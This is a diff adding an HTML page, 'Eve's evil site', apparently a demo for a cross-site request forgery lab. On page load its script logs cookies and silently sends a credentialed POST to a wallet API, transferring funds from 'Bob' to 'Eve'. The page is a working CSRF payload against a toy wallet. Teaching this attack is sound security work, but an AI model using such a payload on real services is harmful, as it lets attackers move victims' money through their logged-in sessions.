@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../css/general.css">
+    <title>Eve's evil site</title>
+</head>
+<body>
+    <div id="message">
+        <h1>Nothing to be seen here...</h1>
+        <p>Maybe developer tools (F12) could reveal what's hidden....</p>
+        <p>You can now close this page and check Bob's account balance.</p>
+    </div>
+
+    <script>
+        const API_PORT = "80";
+        const API_URL  = `${window.location.protocol}//${window.location.hostname}:${API_PORT}`;
+        const query = window.location.search;
+        const params = new URLSearchParams(query);
+        console.log("cookie:");
+        console.log(document.cookie);
+        async function steal_btc() {
+            var res = await fetch(API_URL + `/wallet/send`, {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Referrer-Policy': 'no-referrer'
+                },
+                body: JSON.stringify(
+                    {
+                        "fromId": "Bob",
+                        "toId": "Eve",
+                        "value": "25",
+                        "secure": params.get('secure'),
+                    })
+            }).catch((res) => {
+                console.log(res);
+            });
+            
+            if (!res.ok) {
+                console.log(res);
+                let message = document.getElementById("message");
+                message.innerHTML = "<div id='message'><h1>Malicious transaction has failed...</h1><p>Server refused to process transaction.</p></div>";
+            }
+        }
+        steal_btc();
+    </script>
+</body>
+</html>
